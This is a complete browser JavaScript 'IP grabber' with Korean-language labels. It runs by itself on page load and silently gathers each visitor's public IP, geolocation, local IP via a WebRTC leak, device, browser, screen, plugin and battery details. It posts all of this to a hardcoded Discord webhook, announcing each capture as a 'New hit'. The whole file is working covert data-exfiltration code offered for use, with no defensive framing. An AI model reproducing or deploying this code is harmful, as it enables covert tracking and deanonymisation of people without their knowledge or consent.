(function() {
    'use strict';

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1525330908612395068/BYT2FktnWyxxcutDfmEkfFYuxMiar92CnT9aD2fHteMwLFkshTXlIU3xvWCL6kBjljE9';

    if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
        console.warn('[Grabber] Discord Webhook URL is not set.');
        return;
    }

    function getTimestamp() {
        return new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
    }

    function parseUserAgent(ua) {
        const info = { browser: 'Unknown', os: 'Unknown', device: 'Desktop', isMobile: false, isBot: false };

        if (/bot|crawl|spider|scraper|slurp|archive|wget|curl|facebook|twitterbot|whatsapp|telegram/i.test(ua)) {
            info.isBot = true;
            info.device = 'Bot/Crawler';
        }

        if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
            info.isMobile = true;
            info.device = 'Mobile';
        }
        if (/iPad|Tablet|PlayBook|Silk/i.test(ua) || (ua.includes('Android') && !ua.includes('Mobile'))) {
            info.device = 'Tablet';
        }

        if (ua.includes('Windows NT 10.0')) info.os = 'Windows 10';
        else if (ua.includes('Windows NT 11.0')) info.os = 'Windows 11';
        else if (ua.includes('Windows NT 6.3')) info.os = 'Windows 8.1';
        else if (ua.includes('Windows NT 6.1')) info.os = 'Windows 7';
        else if (ua.includes('Windows')) info.os = 'Windows';
        else if (ua.includes('Mac OS X')) {
            info.os = ua.includes('Intel') ? 'macOS (Intel)' : 'macOS (Apple Silicon)';
        } else if (ua.includes('iPhone') || ua.includes('iPad')) info.os = 'iOS';
        else if (ua.includes('Android')) {
            const match = ua.match(/Android\s([\d.]+)/);
            info.os = match ? `Android ${match[1]}` : 'Android';
        } else if (ua.includes('Linux')) info.os = 'Linux';
        else if (ua.includes('CrOS')) info.os = 'Chrome OS';

        if (ua.includes('Edg/')) info.browser = 'Microsoft Edge';
        else if (ua.includes('OPR/') || ua.includes('Opera/')) info.browser = 'Opera';
        else if (ua.includes('Chrome/') && !ua.includes('Edg/')) info.browser = 'Google Chrome';
        else if (ua.includes('Firefox/') && !ua.includes('Seamonkey/')) info.browser = 'Mozilla Firefox';
        else if (ua.includes('Safari/') && !ua.includes('Chrome/') && !ua.includes('Edg/')) info.browser = 'Apple Safari';
        else if (ua.includes('Trident/') || ua.includes('MSIE')) info.browser = 'Internet Explorer';

        return info;
    }

    function getScreenInfo() {
        return {
            resolution: `${screen.width}x${screen.height}`,
            colorDepth: `${screen.colorDepth}-bit`,
            availResolution: `${screen.availWidth}x${screen.availHeight}`,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown'
        };
    }

    function getPlugins() {
        try {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins.length > 0 ? plugins.join(', ') : 'None detected';
        } catch(e) {
            return 'Access denied';
        }
    }

    function getLocaleInfo() {
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language || navigator.userLanguage,
            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A'
        };
    }

    async function getBatteryInfo() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    level: `${Math.round(battery.level * 100)}%`,
                    charging: battery.charging ? 'Yes' : 'No'
                };
            }
        } catch(e) {}
        return { level: 'N/A', charging: 'N/A' };
    }

    async function grabAndSend() {
        try {
            let publicIP = 'N/A';
            let geoData = {};

            try {
                const ipRes = await fetch('http://ip-api.com/json/?fields=61439&lang=en', {
                    signal: AbortSignal.timeout(8000)
                });
                const ipData = await ipRes.json();

                if (ipData.status === 'success') {
                    publicIP = ipData.query;
                    geoData = {
                        ip: ipData.query,
                        isp: ipData.isp || 'N/A',
                        org: ipData.org || 'N/A',
                        as: ipData.as || 'N/A',
                        country: ipData.country || 'N/A',
                        countryCode: ipData.countryCode || 'N/A',
                        region: ipData.region || 'N/A',
                        regionName: ipData.regionName || 'N/A',
                        city: ipData.city || 'N/A',
                        zip: ipData.zip || 'N/A',
                        lat: ipData.lat || 'N/A',
                        lon: ipData.lon || 'N/A',
                        timezone_tz: ipData.timezone || 'N/A',
                        proxy: ipData.proxy !== undefined ? ipData.proxy : false,
                        hosting: ipData.hosting !== undefined ? ipData.hosting : false,
                        mobile: ipData.mobile !== undefined ? ipData.mobile : false
                    };
                } else {
                    throw new Error(`ip-api failed: ${ipData.message}`);
                }
            } catch (e) {
                try {
                    const fbRes = await fetch('https://api.ipify.org?format=json', {
                        signal: AbortSignal.timeout(5000)
                    });
                    const fbData = await fbRes.json();
                    publicIP = fbData.ip;
                } catch(e2) {
                    publicIP = 'Failed to retrieve';
                }
            }

            let localIP = 'N/A';
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.onicecandidate = (e) => {
                    if (e.candidate && e.candidate.candidate) {
                        const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (match) localIP = match[1];
                    }
                    pc.close();
                };
                await pc.createOffer().then(o => pc.setLocalDescription(o));
                await new Promise(r => setTimeout(r, 1000));
            } catch(e) {}

            const uaInfo = parseUserAgent(navigator.userAgent);
            const screenInfo = getScreenInfo();
            const localeInfo = getLocaleInfo();
            const plugins = getPlugins();
            const batteryInfo = await getBatteryInfo();

            const proxyStatus = geoData.proxy ? '⚠️ YES (Proxy/VPN/Tor)' : '✅ No';
            const hostingStatus = geoData.hosting ? '⚠️ YES (Hosting/DC)' : '✅ No';
            const mobileStatus = geoData.mobile ? '✅ Yes (Cellular)' : '❌ No';

            const locationStr = [
                geoData.country,
                geoData.regionName,
                geoData.city
            ].filter(v => v && v !== 'N/A').join(' > ') || 'N/A';

            const embed = {
                title: '📡 IP & Device Info Captured',
                color: 0x5865F2,
                timestamp: new Date().toISOString(),
                footer: { text: 'Made By Kaisar' },
                fields: [
                    {
                        name: '🌐 공인 IP 정보',
                        value: [
                            `\`\`\``,
                            `IP: ${geoData.ip || publicIP}`,
                            `ISP: ${geoData.isp}`,
                            `ORG: ${geoData.org}`,
                            `AS: ${geoData.as}`,
                            `\`\`\``
                        ].join('\n'),
                        inline: false
                    },
                    {
                        name: '📍 위치 정보',
                        value: [
                            `\`\`\``,
                            `주소: ${locationStr}`,
                            `국가코드: ${geoData.countryCode}`,
                            `우편번호: ${geoData.zip}`,
                            `위도: ${geoData.lat}`,
                            `경도: ${geoData.lon}`,
                            `시간대: ${geoData.timezone_tz}`,
                            `\`\`\``
                        ].join('\n'),
                        inline: true
                    },
                    {
                        name: '🛡️ 보안/네트워크 정보',
                        value: [
                            `\`\`\``,
                            `🔒 프록시/VPN: ${proxyStatus}`,
                            `🏢 호스팅/DC: ${hostingStatus}`,
                            `📱 모바일망: ${mobileStatus}`,
                            `💻 로컬 IP: ${localIP}`,
                            `\`\`\``
                        ].join('\n'),
                        inline: true
                    },
                    {
                        name: '💻 기기 & 브라우저',
                        value: [
                            `\`\`\``,
                            `OS: ${uaInfo.os}`,
                            `Browser: ${uaInfo.browser}`,
                            `Device: ${uaInfo.device}`,
                            `Mobile: ${uaInfo.isMobile ? 'Yes' : 'No'}`,
                            `Bot: ${uaInfo.isBot ? '⚠️ Yes' : 'No'}`,
                            `\`\`\``
                        ].join('\n'),
                        inline: false
                    },
                    {
                        name: '🖥️ 화면 & 시스템',
                        value: [
                            `\`\`\``,
                            `해상도: ${screenInfo.resolution}`,
                            `가용영역: ${screenInfo.availResolution}`,
                            `색상: ${screenInfo.colorDepth}`,
                            `화면방향: ${screenInfo.orientation}`,
                            `\`\`\``
                        ].join('\n'),
                        inline: true
                    },
                    {
                        name: '🔌 플러그인 & 언어',
                        value: [
                            `\`\`\``,
                            `언어: ${localeInfo.language}`,
                            `지원언어: ${localeInfo.languages}`,
                            `시간대: ${localeInfo.timezone}`,
                            `플러그인: ${plugins.substring(0, 200)}`,
                            `\`\`\``
                        ].join('\n'),
                        inline: true
                    },
                    {
                        name: '🔋 배터리 상태',
                        value: [
                            `\`\`\``,
                            `잔량: ${batteryInfo.level}`,
                            `충전중: ${batteryInfo.charging}`,
                            `\`\`\``
                        ].join('\n'),
                        inline: true
                    }
                ]
            };

            if (navigator.userAgent.length <= 1000) {
                embed.fields.push({
                    name: '📋 Raw User-Agent',
                    value: `\`\`\`${navigator.userAgent}\`\`\``,
                    inline: false
                });
            }

            const payload = {
                username: 'IP Grabber',
                avatar_url: 'https://i.imgur.com/5tVc5gE.png',
                embeds: [embed],
                content: `@here **New hit!** ${getTimestamp()}`
            };

            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log('[Grabber] Success');
            } else {
                console.error('[Grabber] Failed:', response.status);
            }

        } catch (error) {
            console.error('[Grabber] Error:', error);
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(grabAndSend, 500);
        });
    } else {
        setTimeout(grabAndSend, 500);
    }

})();